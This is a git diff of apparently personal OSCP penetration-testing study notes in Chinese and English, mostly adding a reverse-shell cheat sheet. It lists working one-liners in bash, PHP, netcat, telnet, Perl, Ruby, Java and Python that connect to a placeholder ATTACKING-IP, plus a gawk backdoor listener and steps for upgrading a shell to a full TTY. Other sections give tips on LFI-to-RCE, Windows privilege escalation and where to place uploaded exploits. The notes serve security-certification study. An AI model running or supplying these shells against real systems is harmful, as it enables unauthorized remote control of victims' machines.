@@ -1,16 +1,209 @@
 # Learn OSCP
 
-##### EXP
+### EXP
 
 1. [01_lfi_phpinfo_exp.py](exps/01_lfi_phpinfo_exp.py)  利用 *LFI* 和 *PHPINFO* 到 *getshell*，[资料来源](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)
 
 
 
-**Hack Bar**
+### **Hack Bar**
 
 - *Remember turn off the automatic updates*
 
 - *Post request not work as excepted*
+
+
+
+### 识别操作系统位数
+
+- *i686*  *i386* 代表 32 位操作系统
+- *x86_64* 代表 64 位操作系统
+
+### **在 64 位的 *kali* 上编译 32 位系统的exp**
+
+- 安装特定依赖库
+
+  ```bash
+  $ apt-get install build-essential module-assistant gcc-multilib g++-multilib -y
+  ```
+
+- 编译
+
+  ```bash
+  $ gcc -m32 exp.c
+  ```
+
+  
+
+### From  Reverse Shell to Spawning a TTY Shell
+
+*Reverse shell*
+
+***Built-in Bash***
+
+```bash
+$ exec /bin/bash 0&0 2>&0
+$ 0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
+
+
+$ exec 5<>/dev/tcp/ATTACKING-IP/80
+$ cat <&5 | while read line; do $line 2>&5 >&5; done  
+
+# or:
+
+$ while read line 0<&5; do $line 2>&5 >&5; done
+```
+
+```bash
+$ bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
+```
+
+***PHP Reverse Shell***
+
+```PHP
+$ php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
+```
+
+***Netcat Reverse Shell***
+
+```bash
+$ nc -e /bin/sh ATTACKING-IP 80
+
+$ /bin/sh | nc ATTACKING-IP 80
+
+$ rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
+```
+
+***Telnet Reverse Shell***
+
+```bash
+$ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+
+$ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+```
+
+***Perl Reverse Shell***
+
+```PERL
+$ perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+*Perl Windows Reverse Shell*
+
+```BASH
+$ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
+
+```BASH
+perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+***Ruby Reverse Shell***
+
+```RUBY
+$ ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+***Java Reverse Shell***
+
+```java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+***Python Reverse Shell***
+
+```PYTHON
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+***Gawk Reverse Shell***
+
+```SHELL
+#!/usr/bin/gawk -f
+
+BEGIN {
+        Port    =       8080
+        Prompt  =       "bkd> "
+
+        Service = "/inet/tcp/" Port "/0/0"
+        while (1) {
+                do {
+                        printf Prompt |& Service
+                        Service |& getline cmd
+                        if (cmd) {
+                                while ((cmd |& getline) > 0)
+                                        print $0 |& Service
+                                close(cmd)
+                        }
+                } while (cmd != "exit")
+                close(Service)
+        }
+}
+```
+
+#### Spawning a TTY Shell
+
+- `python -c 'import pty; pty.spawn("/bin/sh")'`
+- `echo os.system('/bin/bash')`
+- `/bin/sh -i`
+- `perl —e 'exec "/bin/sh";'`
+- `perl: exec "/bin/sh";`
+- `ruby: exec "/bin/sh"`
+- `lua: os.execute('/bin/sh')`
+- `exec "/bin/sh"`  From within IRB
+- `:!bash` From within vi
+- `:set shell=/bin/bash:shell` From with wi
+
+#### Upgrading TTY Shell
+
+1. 升级成 *tty shell*
+
+```bash
+[www-data@targethosts]$ python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+2. 在 *shell* 中设置 *term* 类型为 *kali* 的 *term* 类型
+
+```bash
+root@kali# echo $TERM
+					 xterm-256color
+```
+
+```bash
+[www-data@targethosts]$ export TERM=xterm-256color
+[www-data@targethosts]$ export SHELL=/bin/bash
+```
+
+3. 检查 *term* 的 *rows* 和 *columns*
+
+```shell
+root@kali# stty size
+					 23		80
+```
+
+4. 将得到的 *shell* 放在后台运行
+
+```bash
+[www-data@targethosts]$ ^Z
+												[1]+ Stopped   nc -lvp 449
+												
+[www-data@targethosts]$ stty raw -echo;fg
+```
+
+接着执行 *reset* 命令进行对 *shell* 初始化，并通过 *stty* 设置 *rows* 和 *columns*
+
+```bash
+[www-data@targethosts]$ stty raw -echo;fg
+												nc -lvp 449
+																		reset
+																		
+[www-data@targethosts]$ stty rows 24 columns 80
+```
+
+***tips*** ： 如果出现 `'xterm-256color': unknown terminal type.`，则说明 *targethosts* 不支持该终端，可以改为 `xterm`。
 
 
 
@@ -27,7 +220,7 @@
 
 
 
-##### LFI2RCE
+### LFI2RCE
 
 原理：通过在服务器上写下代码，接着通过 *LFI* 利用该代码
 
@@ -51,7 +244,7 @@
 
 1. [LFI2RCE](https://www.exploit-db.com/papers/12992)
 
-#### Privilege Escalation for Windows
+### Privilege Escalation for Windows
 
 
 - [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
@@ -62,7 +255,7 @@
 - [Windows_Privesec](https://gist.github.com/sckalath/8dacd032b65404ef7411) 与  [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html) 的 *Roll up Your Sleeves* 比较像
 - [OSCP-Windows-privilege-escalation](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html) 与 第一篇文章相比，条理更清晰，内容更精简， 建议结合起来使用。
 
-#### Tips
+### Tips
 
 ##### SMB 信息收集
 
@@ -111,7 +304,7 @@ $ nmap -v -sV -sT --top-ports 10 --open x.x.x.x  # 快速扫描 top 10 端口
 
 
 
-#####  查看当前用户身份的方式
+###  查看当前用户身份的方式
 
 ```vbscript
 # 无法执行 whoami 以及 echo %username% 的场景
@@ -125,13 +318,13 @@ dir /q
 
 
 
-##### 文件上传的存放位置
+### 文件上传的存放位置
 
 `C:\RECYCLER ` 通常是可读写的目录，上传的 *exp* 建议放在这儿。
 
 
 
-##### Bash 创建特殊的文件
+### Bash 创建特殊的文件
 
 ```bash
 touch ./-filename.txt
@@ -140,7 +333,7 @@ rm ./-filename.txt
 rm -- --filename.txt
 ```
 
-##### 查找权限存在问题的的 services
+### 查找权限存在问题的的 services
 
 *[accesschk](https://web.archive.org/web/20111111130246/http://live.sysinternals.com/accesschk.exe)* (*Windows XP*) 可用于判断 *servcies* 的权限，总是先执行 `/acceptula`。因为第一次执行该程序会弹窗，所以带入参数来确认弹窗。
 
